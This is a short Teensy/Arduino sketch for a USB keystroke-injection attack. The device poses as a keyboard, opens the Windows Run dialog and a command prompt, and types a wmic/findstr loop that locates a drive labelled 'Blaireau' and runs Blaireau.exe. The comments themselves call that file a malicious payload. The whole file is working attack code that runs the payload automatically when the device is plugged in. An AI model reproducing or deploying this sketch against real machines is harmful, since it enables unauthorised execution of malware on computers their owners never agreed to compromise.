/* Simple USB AutoRun Keyboard Example
   Teensy becomes a USB keyboard and execute a malicious file
   You must select "Disk(Internal) + Keyboard" from the "Tools > USB Type" menu inside your Arduino IDE
   Don't forget also to select your correct keyboard layout in the menu
*/

void setup()
{
delay(7000); // 7 seconds delay

Keyboard.set_modifier(MODIFIERKEY_GUI); // Holds down the Windows Key
Keyboard.send_now();

Keyboard.set_key1(KEY_R); // Now holds down the R key, opening Run
Keyboard.send_now();

Keyboard.set_modifier(0); // Release modifier key
Keyboard.set_key1(0); // Release the keys
Keyboard.send_now();

delay(500); // 500 miliseconds delay
Keyboard.print("cmd"); // Type in "cmd" into Run
Keyboard.set_key1(0);
Keyboard.set_key1(KEY_ENTER); // Press enter to open cmd
Keyboard.send_now();

Keyboard.set_key1(0);
Keyboard.send_now();
delay(500); // 500 miliseconds delay
Keyboard.print("for /f %d in ('wmic volume get driveletter^, label ^| findstr \"Blaireau\"') do %d\\Blaireau.exe"); // search for the drive name and gets the drive letter then execute the payload
Keyboard.set_key1(KEY_ENTER); // Press enter to execute the command
Keyboard.send_now();
Keyboard.set_key1(0);

delay(200);
Keyboard.send_now();
Keyboard.print("exit"); // Use this command to exit CMD
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();

Keyboard.set_key1(0);
Keyboard.send_now();
}
void loop() {} // Runs this until the USB is plugged out, it's better to run the above command once than to loop it...
